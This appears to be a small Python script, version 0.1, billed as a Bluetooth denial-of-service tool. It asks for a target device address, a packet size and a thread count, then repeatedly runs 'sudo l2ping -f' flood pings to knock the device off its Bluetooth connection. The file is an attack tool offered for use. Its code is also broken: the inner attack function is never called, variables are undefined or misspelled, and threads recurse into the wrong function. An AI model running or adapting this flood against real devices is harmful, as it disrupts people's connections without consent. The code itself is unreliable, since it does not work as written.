#About: Script that uses l2ping to flood a device to interupt their bluetooth connection.
#Version: 0.1
import os
import sys
import time
import subprocess
from threading import Thread

abort_attack = False

def attack(deviceAddress, bulltetSize):
    def do_attack():
        while not abort_attack:
            subprocess.run(["sudo", "l2ping", "-s", bulltetSize, "-f", deviceAddress])
    for i in range(guns):
        Thread(target=attack, args=(address, bulletSize)).start()
    return

def main():
    print("Bluetooth Denial of Service")
    address = input("Enter the device address: ")
    address.strip()
    if len(address) != 17:
        print("Invalid address.")
        input("Press enter to continue...")
        return
    bulletSize = input("Enter bullet size: ")
    guns = min(int(input("How many guns do you want to use? ")), 10)
    
    
    attack(address, bulletSize)
    input("Press enter to continue...")
    return

main()